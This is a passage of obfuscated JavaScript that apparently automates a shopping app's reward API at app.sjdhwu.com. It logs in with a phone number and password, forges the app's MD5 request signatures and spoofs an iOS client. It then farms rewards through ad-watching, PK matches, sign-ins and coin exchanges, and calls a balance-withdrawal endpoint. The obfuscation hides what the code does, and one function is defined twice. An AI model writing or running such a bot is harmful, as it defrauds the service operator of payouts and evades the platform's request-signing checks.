_0x4ded36;for(_0x4ded36=0x0;_0x4ded36<0x100;_0x4ded36++){_0x1eb03a[_0x4ded36]=_0x4ded36;}for(_0x4ded36=0x0;_0x4ded36<0x100;_0x4ded36++){_0x9099a6=(_0x9099a6+_0x1eb03a[_0x4ded36]+_0x586ebb['charCodeAt'](_0x4ded36%_0x586ebb['length']))%0x100,_0x13de7e=_0x1eb03a[_0x4ded36],_0x1eb03a[_0x4ded36]=_0x1eb03a[_0x9099a6],_0x1eb03a[_0x9099a6]=_0x13de7e;}_0x4ded36=0x0,_0x9099a6=0x0;for(let _0x4b3c72=0x0;_0x4b3c72<_0x1925d0['length'];_0x4b3c72++){_0x4ded36=(_0x4ded36+0x1)%0x100,_0x9099a6=(_0x9099a6+_0x1eb03a[_0x4ded36])%0x100,_0x13de7e=_0x1eb03a[_0x4ded36],_0x1eb03a[_0x4ded36]=_0x1eb03a[_0x9099a6],_0x1eb03a[_0x9099a6]=_0x13de7e,_0x1c7186+=String['fromCharCode'](_0x1925d0['charCodeAt'](_0x4b3c72)^_0x1eb03a[(_0x1eb03a[_0x4ded36]+_0x1eb03a[_0x9099a6])%0x100]);}return _0x1c7186;};_0x4a20['AlPxrZ']=_0x2a99d2,_0x30bfdc=arguments,_0x4a20['BKpTHL']=!![];}const _0x3508e3=_0x517c5d[0x0],_0x428033=_0x3b7deb+_0x3508e3,_0xf30eb=_0x30bfdc[_0x428033];return!_0xf30eb?(_0x4a20['tWCpAC']===undefined&&(_0x4a20['tWCpAC']=!![]),_0x558ea8=_0x4a20['AlPxrZ'](_0x558ea8,_0x57561c),_0x30bfdc[_0x428033]=_0x558ea8):_0x558ea8=_0xf30eb,_0x558ea8;},_0x4a20(_0x30bfdc,_0x107670);}function stringToBase64(_0x54a82b){const _0xae794=_0x460acf,_0x435a2e=_0x1d04f9;var _0x213096=Buffer[_0x435a2e(0x32c)](_0x54a82b)[_0xae794(0x212,'cd0^')](_0x435a2e(0x29c));return _0x213096;}function _0x3b7d(_0x30bfdc,_0x107670){const _0x517c5d=_0x517c();return _0x3b7d=function(_0x3b7deb,_0x57561c){_0x3b7deb=_0x3b7deb-0x1e6;let _0x558ea8=_0x517c5d[_0x3b7deb];return _0x558ea8;},_0x3b7d(_0x30bfdc,_0x107670);}function zldl(_0x23f215='',_0x1d8645='',_0x244998=0x0){const _0x1cf3e8=_0x460acf,_0x54a3d9=_0x163887,_0x3ce7d5=_0x1d04f9;let _0x58718d=parseInt(Date[_0x3ce7d5(0x279)](new Date())/0x3e8),_0x141515=MD5(_0x58718d),_0x91baa=MD5Encrypt(_0x58718d+'--1071552--'+key+_0x54a3d9(0x307)+_0x141515+_0x1cf3e8(0x2cd,'M3a$')+key+key+_0x54a3d9(0x257)+key+key+_0x3ce7d5(0x333)+password+key+key+_0x54a3d9(0x231)+phone+key+key+'target_value--'+_0x141515+key)['toUpperCase']();return _0x58718d=_0x1d8645?_0x1d8645:_0x58718d,_0x91baa=_0x23f215?_0x23f215:_0x91baa,new Promise(_0x432352=>{const _0x41407c=_0x1cf3e8,_0xe0ddb6=_0x54a3d9,_0x518af5=_0x3ce7d5;let _0x531c6b={'url':_0x518af5(0x2db),'headers':JSON[_0x518af5(0x279)]('{\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22Authorization\x22:\x22Bearer\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22sign\x22:\x22868488030787145\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22Yw-Time\x22:\x22'+_0x58718d+_0xe0ddb6(0x2d5)+_0x91baa+_0x41407c(0x262,'o6so')),'body':_0x41407c(0x362,'mtlz')+password+'&device_name=SKR-A0&phone='+phone+_0x41407c(0x2c4,'HyeE')+_0x141515+'&client_tag='+_0x141515+'R5LMu8V9izyEzEqEfozvXCmQBvk45ePZtw8M784GFhJe%0AFYBlbBl190tpTheXtI9babVRFlueO5KAmrrrjN7K5e%2BEkKrbv5wsnLBx4ZR%2BJUKY7mhLpkVVXqKu%0Anb28hr8jF%2BnoO%2BDncuwNMfl4cVlscKku9U7ZFVy5%0A'};$[_0xe0ddb6(0x299)](_0x531c6b,async(_0x12b7a1,_0x3271d9,_0x4c55ad)=>{const _0x28eb41=_0xe0ddb6,_0x20ffba=_0x41407c,_0x577cb6=_0x518af5;try{const _0x36453e=JSON[_0x577cb6(0x279)](_0x4c55ad);_0x36453e[_0x20ffba(0x2ca,'Lu^b')]==0x1f4&&_0x36453e['data']&&(await $['wait'](0x1f4),await zldl(_0x36453e[_0x28eb41(0x311)],_0x58718d));if(_0x36453e[_0x28eb41(0x20c)]==0xc8){cookie=_0x3271d9[_0x577cb6(0x259)]['set-cookie']['join'](';')+';',token=_0x36453e[_0x577cb6(0x34e)][_0x20ffba(0x1fa,'UD06')],console[_0x20ffba(0x356,'nJp#')]('登陆成功'),iarrr=[0x1,0x2,0x3],pk='';for(let _0x4dcd5d of iarrr){await watchAdsToIncreasePkTimes(),await $['wait'](0x1f4);}pk='';for(let _0x15f3e3 of iarrr){await memberMatchV3(),await $[_0x577cb6(0x24e)](0x1f4);}await sphb(),await $[_0x20ffba(0x2bc,'csQz')](0x1f4),await sprw(),await $[_0x20ffba(0x350,'1dz4')](0x1f4),await newSignIn(),await $[_0x577cb6(0x24e)](0x1f4),await freeFlops(),await $[_0x20ffba(0x361,'CWQw')](0x1f4),await prizeGet(),await $[_0x20ffba(0x22e,'RQ@[')](0x1f4),await exchangeExperiencePotion(),await $[_0x28eb41(0x2d4)](0x1f4),await myClub(),await $[_0x20ffba(0x23e,'WFU6')](0x1f4),await goldCoinExchange(),await $[_0x20ffba(0x237,'Wwle')](0x1f4),await homeBubbleRewardInformation(),await infos();}else console[_0x20ffba(0x2b8,'o6so')](_0x577cb6(0x226),_0x36453e[_0x577cb6(0x2a0)]);}catch(_0x41a9ed){}finally{_0x432352();}},_0x244998);});}function infos(_0x3e5901='',_0x1cb0b4='',_0x502707=0x0){return new Promise(_0x3bfbf4=>{const _0x47f01c=_0x2a99,_0x33505d=_0x4a20,_0x12bce7=_0x3b7d;let _0xe43bce=parseInt(Date[_0x12bce7(0x301)](new Date())/0x3e8),_0x3cb9c0=MD5Encrypt(_0xe43bce+_0x33505d(0x2de,'9lxV')+key+'--'+key)[_0x47f01c(0x263)]();_0xe43bce=_0x1cb0b4?_0x1cb0b4:_0xe43bce,_0x3cb9c0=_0x3e5901?_0x3e5901:_0x3cb9c0;let _0x4eaca8={'url':_0x47f01c(0x348),'headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':_0x12bce7(0x27d)+token,'X-Requested-With':_0x47f01c(0x203),'Accept-Language':'zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','Accept-Encoding':_0x12bce7(0x291),'Accept':_0x47f01c(0x272),'Yw-Number':'10470706','User-Agent':_0x12bce7(0x24d),'Content-Length':'0','Yw-Sign':_0x3cb9c0,'Connection':_0x47f01c(0x25d),'Yw-Time':_0xe43bce,'Cookie':cookie,'sign':_0x12bce7(0x268)}};$['get'](_0x4eaca8,async(_0x489e6d,_0x667d2,_0x469f65)=>{const _0x23c5bd=_0x33505d,_0x21f8ea=_0x12bce7,_0x3c16c1=_0x47f01c;try{const _0x6897fb=JSON[_0x3c16c1(0x279)](_0x469f65);_0x6897fb[_0x3c16c1(0x23a)]==0x1f4&&_0x6897fb['data']&&(await $[_0x3c16c1(0x24e)](0x1f4),await infos(_0x6897fb[_0x3c16c1(0x34e)],_0xe43bce)),_0x6897fb[_0x21f8ea(0x20c)]==0xc8&&(console[_0x21f8ea(0x2f4)](_0x21f8ea(0x201)+_0x6897fb[_0x3c16c1(0x34e)][_0x23c5bd(0x245,'nJp#')]+_0x3c16c1(0x2a7)+_0x6897fb[_0x3c16c1(0x34e)][_0x21f8ea(0x282)]),await balanceWithdrawApply()),_0x6897fb['code']==0x1f4&&_0x6897fb[_0x23c5bd(0x287,'*DhG')]==null&&console['log'](_0x3c16c1(0x29a),_0x6897fb[_0x3c16c1(0x2a0)]);}catch(_0x21564e){}finally{_0x3bfbf4();}},_0x502707);});}function sphb(_0x4db700='',_0x279425='',_0x3ac8ec=0x0){return new Promise(_0x929b0=>{const _0x3864d9=_0x3b7d,_0x2b3066=_0x2a99,_0x26c1e9=_0x4a20;let _0x46b17c=parseInt(Date['parse'](new Date())/0x3e8),_0x5dbe2a=MD5Encrypt(_0x46b17c+'--10470706--'+key+'--'+key)[_0x26c1e9(0x2e5,'RXMb')]();_0x46b17c=_0x279425?_0x279425:_0x46b17c,_0x5dbe2a=_0x4db700?_0x4db700:_0x5dbe2a;let _0x5479e2={'url':_0x2b3066(0x363),'headers':{'Host':_0x3864d9(0x325),'version':'v3','plat':'1','Authorization':_0x26c1e9(0x23b,'aI&O')+token,'X-Requested-With':_0x3864d9(0x368),'Accept-Language':_0x26c1e9(0x2fe,'ycEU'),'Accept-Encoding':_0x3864d9(0x291),'Accept':_0x3864d9(0x2ba),'Yw-Number':_0x26c1e9(0x2b1,'*DhG'),'User-Agent':_0x26c1e9(0x1ed,'loX$'),'Content-Length':'0','Yw-Sign':_0x5dbe2a,'Connection':_0x2b3066(0x25d),'Yw-Time':_0x46b17c,'Cookie':cookie,'sign':_0x26c1e9(0x296,'k4E%')}};$[_0x3864d9(0x299)](_0x5479e2,async(_0x42c320,_0x2cbbf3,_0x252117)=>{const _0x571ded=_0x3864d9,_0x35026c=_0x2b3066,_0x18ce48=_0x26c1e9;try{const _0x276555=JSON[_0x18ce48(0x289,'iO!T')](_0x252117);_0x276555[_0x35026c(0x23a)]==0x1f4&&_0x276555[_0x35026c(0x34e)]&&(await $['wait'](0x1f4),await sphb(_0x276555['data'],_0x46b17c)),_0x276555['code']==0xc8&&console[_0x35026c(0x316)](_0x18ce48(0x252,'QS2%')+_0x276555[_0x571ded(0x311)]['number']+_0x276555['data'][_0x18ce48(0x35d,'O!*a')]),_0x276555['code']==0x1f4&&_0x276555[_0x35026c(0x34e)]==null&&console['log']('视频红包：',_0x276555[_0x35026c(0x2a0)]);}catch(_0x471bc1){}finally{_0x929b0();}},_0x3ac8ec);});}function goldCoinExchange(_0x20ae9f='',_0x277462='',_0x59fed2=0x0){return new Promise(_0x524023=>{const _0x18068d=_0x2a99,_0x249b38=_0x3b7d,_0x44419c=_0x4a20;let _0x68f6c0=parseInt(Date[_0x44419c(0x2f6,'e#8[')](new Date())/0x3e8),_0x2aeb48=MD5Encrypt(_0x68f6c0+_0x249b38(0x33c)+key+'--'+key)['toUpperCase']();_0x68f6c0=_0x277462?_0x277462:_0x68f6c0,_0x2aeb48=_0x20ae9f?_0x20ae9f:_0x2aeb48;let _0xccab75={'url':_0x18068d(0x1ef),'headers':{'Host':_0x44419c(0x1f9,'PC)W'),'version':'v3','plat':'1','Authorization':_0x18068d(0x239)+token,'X-Requested-With':_0x44419c(0x30a,'iO!T'),'Accept-Language':_0x18068d(0x258),'Accept-Encoding':_0x44419c(0x21a,'ycEU'),'Accept':'*/*','Yw-Number':'10470706','User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Length':'0','Yw-Sign':_0x2aeb48,'Connection':_0x18068d(0x25d),'Yw-Time':_0x68f6c0,'Cookie':cookie,'sign':_0x18068d(0x26c)}};$['post'](_0xccab75,async(_0x352852,_0x2d6c37,_0x27eb7a)=>{const _0x4bfd35=_0x44419c,_0xff0a68=_0x249b38,_0x33d268=_0x18068d;try{const _0x5967dd=JSON[_0x33d268(0x279)](_0x27eb7a);_0x5967dd[_0x33d268(0x23a)]==0x1f4&&_0x5967dd[_0xff0a68(0x311)]&&(await $[_0x4bfd35(0x21b,'lmLq')](0x1f4),await goldCoinExchange(_0x5967dd[_0xff0a68(0x311)],_0x68f6c0)),_0x5967dd['code']==0xc8&&console[_0x4bfd35(0x2b8,'o6so')](_0xff0a68(0x29d),_0x5967dd[_0xff0a68(0x232)]),_0x5967dd[_0x33d268(0x23a)]==0x1f4&&_0x5967dd['data']==null&&console[_0x4bfd35(0x2a5,'UD06')](_0x33d268(0x219),_0x5967dd[_0x4bfd35(0x25b,'*qCn')]);}catch(_0x21211c){}finally{_0x524023();}},_0x59fed2);});}function newSignIn(_0x1f0a5c='',_0x15e577='',_0x383572=0x0){return new Promise(_0x26d90c=>{const _0x18e120=_0x3b7d,_0x116f68=_0x4a20,_0x4bcb7f=_0x2a99;let _0x347b07=parseInt(Date['parse'](new Date())/0x3e8),_0x15370c=MD5Encrypt(_0x347b07+_0x4bcb7f(0x206)+key+'--'+key)[_0x4bcb7f(0x263)]();_0x347b07=_0x15e577?_0x15e577:_0x347b07,_0x15370c=_0x1f0a5c?_0x1f0a5c:_0x15370c;let _0x46aa75={'url':'https://app.sjdhwu.com/yw_api/v3/newSignIn','headers':{'Host':_0x4bcb7f(0x2ad),'version':'v3','plat':'1','Authorization':_0x116f68(0x2e3,'nJp#')+token,'X-Requested-With':_0x18e120(0x368),'Accept-Language':_0x18e120(0x322),'Accept-Encoding':_0x4bcb7f(0x1f1),'Accept':_0x18e120(0x2ba),'Yw-Number':_0x4bcb7f(0x308),'User-Agent':_0x4bcb7f(0x2ee),'Content-Length':'0','Yw-Sign':_0x15370c,'Connection':_0x18e120(0x238),'Yw-Time':_0x347b07,'Cookie':cookie,'sign':_0x4bcb7f(0x26c)}};$[_0x116f68(0x2f3,'ycEU')](_0x46aa75,async(_0x354720,_0x4e4b9a,_0x298f59)=>{const _0x128ad9=_0x4bcb7f,_0xd0cbdc=_0x18e120,_0x222d51=_0x116f68;try{const _0x4725ca=JSON[_0x222d51(0x1ec,'aI&O')](_0x298f59);_0x4725ca[_0xd0cbdc(0x20c)]==0x1f4&&_0x4725ca[_0x222d51(0x23c,'k4E%')]&&(await $[_0x222d51(0x2be,'O!*a')](0x1f4),await newSignIn(_0x4725ca[_0xd0cbdc(0x311)],_0x347b07)),_0x4725ca[_0xd0cbdc(0x20c)]==0xc8&&console[_0x128ad9(0x316)]('签到：获得'+_0x4725ca[_0x128ad9(0x34e)][_0x222d51(0x233,'b%Rl')]+_0x4725ca[_0x128ad9(0x34e)][_0x128ad9(0x2fc)]),_0x4725ca[_0x128ad9(0x23a)]==0x1f4&&_0x4725ca[_0xd0cbdc(0x311)]==null&&(console[_0xd0cbdc(0x2f4)](_0xd0cbdc(0x360),_0x4725ca['message']),_0x4725ca['message']==_0x222d51(0x1ff,'b%Rl')&&(await $[_0xd0cbdc(0x2d4)](0x3c8c),await newSignIn()));}catch(_0x496e7d){}finally{_0x26d90c();}},_0x383572);});}function sprw(_0x1d33fc='',_0xbc3ae1='',_0x45ea67=0x0){return new Promise(_0x3c6dcd=>{const _0x469423=_0x4a20,_0x139e93=_0x2a99,_0x541c2b=_0x3b7d;let _0x348985=parseInt(Date['parse'](new Date())/0x3e8),_0x574956=MD5Encrypt(_0x348985+'--10470706--'+key+'--'+key)[_0x541c2b(0x2df)]();_0x348985=_0xbc3ae1?_0xbc3ae1:_0x348985,_0x574956=_0x1d33fc?_0x1d33fc:_0x574956;let _0x83a312={'url':_0x139e93(0x27e),'headers':{'Host':_0x541c2b(0x325),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':'XMLHttpRequest','Accept-Language':_0x541c2b(0x322),'Accept-Encoding':_0x541c2b(0x291),'Accept':'*/*','Yw-Number':_0x469423(0x28b,'k4E%'),'User-Agent':_0x469423(0x33d,'W]ep'),'Content-Length':'0','Yw-Sign':_0x574956,'Connection':_0x541c2b(0x238),'Yw-Time':_0x348985,'Cookie':cookie,'sign':'1234567890'}};$[_0x139e93(0x2e1)](_0x83a312,async(_0x51861f,_0x5348eb,_0x333f3e)=>{const _0x5da9b6=_0x469423,_0x6e302=_0x139e93,_0x51321c=_0x541c2b;try{const _0x12266e=JSON[_0x51321c(0x301)](_0x333f3e);_0x12266e['code']==0x1f4&&_0x12266e['data']&&(await $[_0x51321c(0x2d4)](0x1f4),await sprw(_0x12266e['data'],_0x348985)),_0x12266e[_0x51321c(0x20c)]==0xc8&&console['log'](_0x6e302(0x352),_0x12266e[_0x6e302(0x2a0)]),_0x12266e['code']==0x1f4&&_0x12266e[_0x5da9b6(0x1f4,'CWQw')]==null&&(console[_0x51321c(0x2f4)](_0x51321c(0x288),_0x12266e[_0x6e302(0x2a0)]),_0x12266e[_0x6e302(0x2a0)]==_0x6e302(0x218)&&(await $['wait'](0x3c8c),await sprw()));}catch(_0x215e5f){}finally{_0x3c6dcd();}},_0x45ea67);});}function watchAdsToIncreasePkTimes(_0x492b79='',_0x32bd1c='',_0x33fac2=0x0){return new Promise(_0x42def8=>{const _0x3bd027=_0x2a99,_0x25fcab=_0x3b7d,_0x3df1af=_0x4a20;let _0x32bd98=parseInt(Date['parse'](new Date())/0x3e8),_0x40c266=MD5Encrypt(_0x32bd98+'--10470706--'+key+'--'+key)[_0x3df1af(0x1f6,'*DhG')]();_0x32bd98=_0x32bd1c?_0x32bd1c:_0x32bd98,_0x40c266=_0x492b79?_0x492b79:_0x40c266;let _0x5a3018={'url':'https://app.sjdhwu.com/yw_api/v3/watchAdsToIncreasePkTimes','headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':'XMLHttpRequest','Accept-Language':_0x3df1af(0x207,'e#8['),'Accept-Encoding':_0x3df1af(0x2a2,'p!n6'),'Accept':_0x25fcab(0x2ba),'Yw-Number':_0x25fcab(0x2b7),'User-Agent':_0x25fcab(0x24d),'Content-Length':'0','Yw-Sign':_0x40c266,'Connection':_0x3bd027(0x25d),'Yw-Time':_0x32bd98,'Cookie':cookie,'sign':_0x3df1af(0x261,'51ib'),'ymavi':_0x3bd027(0x2e2)}};$[_0x25fcab(0x299)](_0x5a3018,async(_0x48fd54,_0x1546ef,_0x194f5e)=>{const _0x5efd5f=_0x3bd027,_0x3115fb=_0x25fcab,_0x1b2701=_0x3df1af;try{const _0x9b75cf=JSON[_0x1b2701(0x2f7,'*DhG')](_0x194f5e);_0x9b75cf[_0x3115fb(0x20c)]==0x1f4&&_0x9b75cf[_0x1b2701(0x211,'b%Rl')]&&(await $[_0x3115fb(0x2d4)](0x1f4),await watchAdsToIncreasePkTimes(_0x9b75cf[_0x5efd5f(0x34e)],_0x32bd98)),_0x9b75cf['code']==0xc8&&(await $[_0x3115fb(0x2d4)](0x1f4),await memberMatchV3()),_0x9b75cf[_0x5efd5f(0x23a)]==0x1f4&&_0x9b75cf[_0x5efd5f(0x34e)]==null&&(console[_0x5efd5f(0x316)](_0x5efd5f(0x260),_0x9b75cf['message']),pk=_0x9b75cf['message'],_0x9b75cf[_0x5efd5f(0x2a0)]==_0x3115fb(0x264)&&await $[_0x5efd5f(0x24e)](0x3c8c));}catch(_0x2451de){}finally{_0x42def8();}},_0x33fac2);});}function memberMatchV3(_0xa02f4f='',_0x516763='',_0x1eb707=0x0){return new Promise(_0x5f4a07=>{const _0x89a87f=_0x3b7d,_0x2093d6=_0x2a99,_0x5de54b=_0x4a20;let _0x1ee8bd=parseInt(Date[_0x5de54b(0x2f6,'e#8[')](new Date())/0x3e8),_0x2dbc06=MD5Encrypt(_0x1ee8bd+'--10470706--'+key+'--'+key)[_0x5de54b(0x32d,'WFU6')]();_0x1ee8bd=_0x516763?_0x516763:_0x1ee8bd,_0x2dbc06=_0xa02f4f?_0xa02f4f:_0x2dbc06;let _0x257a22={'url':'https://app.sjdhwu.com/yw_api/v3/memberMatchV3','headers':{'Host':_0x2093d6(0x2ad),'version':'v3','plat':'1','Authorization':_0x89a87f(0x27d)+token,'X-Requested-With':_0x89a87f(0x368),'Accept-Language':_0x89a87f(0x322),'Accept-Encoding':_0x89a87f(0x291),'Accept':'*/*','Yw-Number':_0x5de54b(0x31d,'p!n6'),'User-Agent':_0x89a87f(0x24d),'Content-Length':'0','Yw-Sign':_0x2dbc06,'Connection':_0x5de54b(0x2d6,'G#JN'),'Yw-Time':_0x1ee8bd,'Cookie':cookie,'sign':'1234567890'}};$[_0x5de54b(0x313,'qWFi')](_0x257a22,async(_0x556f6b,_0x48047d,_0x2916d1)=>{const _0x4364db=_0x5de54b,_0x302a2e=_0x89a87f,_0x574f78=_0x2093d6;try{const _0x4580cd=JSON[_0x574f78(0x279)](_0x2916d1);_0x4580cd['code']==0x1f4&&_0x4580cd['data']&&(await $[_0x574f78(0x24e)](0x1f4),await memberMatchV3(_0x4580cd[_0x302a2e(0x311)],_0x1ee8bd)),_0x4580cd[_0x302a2e(0x20c)]==0xc8&&(await $['wait'](0x1f4),await matchInformationV3()),_0x4580cd[_0x4364db(0x2d1,'%J5B')]==0x1f4&&_0x4580cd[_0x4364db(0x321,'ycEU')]==null&&console[_0x574f78(0x316)](_0x302a2e(0x33e),_0x4580cd[_0x302a2e(0x232)]);}catch(_0x3c674d){}finally{_0x5f4a07();}},_0x1eb707);});}function memberMatchV3(_0x125aae='',_0x270d82='',_0x7c75fb=0x0){return new Promise(_0x502a80=>{const _0x5b74cc=_0x3b7d,_0x4a03f6=_0x2a99,_0x10823e=_0x4a20;let _0x1c8e9f=parseInt(Date['parse'](new Date())/0x3e8),_0x3f4b19=MD5Encrypt(_0x1c8e9f+_0x10823e(0x24b,'6*u0')+key+'--'+key)[_0x4a03f6(0x263)]();_0x1c8e9f=_0x270d82?_0x270d82:_0x1c8e9f,_0x3f4b19=_0x125aae?_0x125aae:_0x3f4b19;let _0x115d5e={'url':_0x10823e(0x2e9,'G#JN'),'headers':{'Host':_0x10823e(0x1f9,'PC)W'),'version':'v3','plat':'1','Authorization':_0x4a03f6(0x239)+token,'X-Requested-With':'XMLHttpRequest','Accept-Language':_0x5b74cc(0x322),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':'*/*','Yw-Number':_0x10823e(0x220,'nJp#'),'User-Agent':_0x5b74cc(0x24d),'Content-Length':'0','Yw-Sign':_0x3f4b19,'Connection':_0x4a03f6(0x25d),'Yw-Time':_0x1c8e9f,'Cookie':cookie,'sign':_0x4a03f6(0x26c)}};$[_0x10823e(0x271,'lo22')](_0x115d5e,async(_0x37bfe4,_0x4243f7,_0x2e553d)=>{const _0x21d330=_0x10823e,_0x508b8d=_0x5b74cc,_0x539690=_0x4a03f6;try{const _0x3aa021=JSON[_0x539690(0x279)](_0x2e553d);_0x3aa021[_0x508b8d(0x20c)]==0x1f4&&_0x3aa021['data']&&(await $[_0x21d330(0x215,'nJp#')](0x1f4),await memberMatchV3(_0x3aa021[_0x539690(0x34e)],_0x1c8e9f)),_0x3aa021[_0x21d330(0x2e4,'6*u0')]==0xc8&&(await $[_0x508b8d(0x2d4)](0x1f4),await matchInformationV3()),_0x3aa021[_0x21d330(0x277,'aI&O')]==0x1f4&&_0x3aa021[_0x539690(0x34e)]==null&&(console[_0x508b8d(0x2f4)]('获取PK失败：',_0x3aa021[_0x539690(0x2a0)]),pk=_0x3aa021[_0x21d330(0x266,'8$Km')]);}catch(_0x3d5e10){}finally{_0x502a80();}},_0x7c75fb);});}function matchInformationV3(_0x334e27='',_0x4dd676='',_0x4400c9=0x0){return new Promise(_0x45df7f=>{const _0x586317=_0x4a20,_0x488c24=_0x3b7d,_0x28733f=_0x2a99;let _0x3b22d1=parseInt(Date['parse'](new Date())/0x3e8),_0x16a43b=MD5Encrypt(_0x3b22d1+_0x28733f(0x206)+key+'--'+key)[_0x488c24(0x2df)]();_0x3b22d1=_0x4dd676?_0x4dd676:_0x3b22d1,_0x16a43b=_0x334e27?_0x334e27:_0x16a43b;let _0x163610={'url':_0x488c24(0x341),'headers':{'Host':_0x28733f(0x2ad),'version':'v3','plat':'1','Authorization':_0x586317(0x243,'b%Rl')+token,'X-Requested-With':_0x28733f(0x203),'Accept-Language':_0x28733f(0x258),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x28733f(0x272),'Yw-Number':_0x586317(0x1f7,'Ur8b'),'User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Length':'0','Yw-Sign':_0x16a43b,'Connection':_0x28733f(0x25d),'Yw-Time':_0x3b22d1,'Cookie':cookie,'sign':_0x28733f(0x26c)}};$[_0x488c24(0x357)](_0x163610,async(_0x34e409,_0x5aa394,_0x16cb63)=>{const _0x1c8403=_0x586317,_0x2c1955=_0x488c24,_0x330c3c=_0x28733f;try{const _0x29678c=JSON['parse'](_0x16cb63);_0x29678c[_0x330c3c(0x23a)]==0x1f4&&_0x29678c[_0x2c1955(0x311)]&&(await $[_0x2c1955(0x2d4)](0x1f4),await matchInformationV3(_0x29678c[_0x330c3c(0x34e)],_0x3b22d1));if(_0x29678c[_0x330c3c(0x23a)]==0xc8){console[_0x1c8403(0x29b,'qWFi')]('获取PK成功');let _0x284c25=_0x29678c[_0x330c3c(0x34e)];for(let _0x221b55 of _0x284c25){await emberPk(_0x221b55['id']),await $[_0x1c8403(0x361,'CWQw')](0x12c);}}_0x29678c[_0x330c3c(0x23a)]==0x1f4&&_0x29678c[_0x2c1955(0x311)]==null&&console[_0x2c1955(0x2f4)]('获取PK：',_0x29678c[_0x2c1955(0x232)]);}catch(_0x24a367){}finally{_0x45df7f();}},_0x4400c9);});}function emberPk(_0x392a35,_0x546191='',_0x55d2ad='',_0x538032=0x0){return new Promise(_0x18f6f2=>{const _0x4a92d4=_0x2a99,_0x42eb84=_0x3b7d,_0x4f7080=_0x4a20;let _0x28bc9d=parseInt(Date[_0x4f7080(0x336,'RXMb')](new Date())/0x3e8),_0x46ebf2=MD5Encrypt(_0x28bc9d+_0x4f7080(0x2a4,'6*u0')+key+_0x42eb84(0x331)+_0x392a35+key)['toUpperCase']();_0x28bc9d=_0x55d2ad?_0x55d2ad:_0x28bc9d,_0x46ebf2=_0x546191?_0x546191:_0x46ebf2;let _0x432c43={'url':_0x42eb84(0x216),'headers':{'Host':_0x42eb84(0x325),'Authorization':'Bearer\x20'+token,'Sign':_0x4f7080(0x2b6,'HyeE'),'Yw-Time':_0x28bc9d,'Yw-Number':_0x4a92d4(0x2c7),'Channel':'1','Versions':'333','Version-Number':'333','Plat':'2','Yw-Sign':_0x46ebf2,'Content-Type':_0x4a92d4(0x2da),'Accept-Encoding':_0x4f7080(0x31b,'NB%D'),'User-Agent':_0x4a92d4(0x269)},'body':_0x4a92d4(0x295)+_0x392a35};$[_0x4f7080(0x337,'b%Rl')](_0x432c43,async(_0x20aeb3,_0x35f07a,_0x443eb5)=>{const _0x3b48c3=_0x42eb84,_0x4b4945=_0x4f7080,_0x54bfaf=_0x4a92d4;try{const _0x4a4336=JSON['parse'](_0x443eb5);_0x4a4336[_0x54bfaf(0x23a)]==0x1f4&&_0x4a4336[_0x4b4945(0x317,'e#8[')]&&(await $[_0x4b4945(0x285,'b%Rl')](0x1f4),await emberPk(_0x392a35,_0x4a4336[_0x3b48c3(0x311)],_0x28bc9d)),_0x4a4336['code']==0xc8&&console[_0x4b4945(0x290,'ycEU')]('PK:\x20与【'+_0x392a35+_0x54bfaf(0x2d8)+_0x4a4336[_0x54bfaf(0x34e)][_0x4b4945(0x367,'8$Km')][0x0][_0x4b4945(0x332,'W]ep')]+'金币'),_0x4a4336['code']==0x1f4&&_0x4a4336['data']==null&&console[_0x4b4945(0x24c,'dHA4')](_0x54bfaf(0x227),_0x4a4336[_0x4b4945(0x346,'Ag]F')]);}catch(_0x42b449){}finally{_0x18f6f2();}},_0x538032);});}function exchangeExperiencePotion(_0xfb0284='',_0x1d1ce9='',_0x1ed3a0='',_0x6c3d98=0x0){return new Promise(_0x2d530f=>{const _0x1d260b=_0x3b7d,_0x5ef171=_0x2a99,_0x56def5=_0x4a20;let _0x1acb62=parseInt(Date[_0x56def5(0x34c,'9lxV')](new Date())/0x3e8),_0x568619=MD5Encrypt(_0x1acb62+_0x5ef171(0x206)+key+'--'+key)[_0x5ef171(0x263)]();_0x1acb62=_0x1ed3a0?_0x1ed3a0:_0x1acb62,_0x568619=_0x1d1ce9?_0x1d1ce9:_0x568619;let _0x3577fd={'url':_0x5ef171(0x2fb),'headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x56def5(0x351,'ycEU'),'Accept-Language':_0x56def5(0x340,'b%Rl'),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':'*/*','Yw-Number':'10470706','User-Agent':_0x1d260b(0x24d),'Content-Type':_0x56def5(0x297,'Lu^b'),'Yw-Sign':_0x568619,'Connection':_0x5ef171(0x25d),'Yw-Time':_0x1acb62,'Cookie':cookie,'sign':_0x56def5(0x33f,'*DhG')},'body':'{\x22experience_potion_id\x22:3,\x22number\x22:1}'};$[_0x56def5(0x2e7,'vwZC')](_0x3577fd,async(_0x311e32,_0x147edf,_0x434c3a)=>{const _0x4776c3=_0x5ef171,_0x42bb8a=_0x1d260b,_0x421b89=_0x56def5;try{const _0x2d27b3=JSON[_0x421b89(0x2a1,'WFU6')](_0x434c3a);_0x2d27b3[_0x42bb8a(0x20c)]==0x1f4&&_0x2d27b3['data']&&(await $[_0x42bb8a(0x2d4)](0x1f4),await 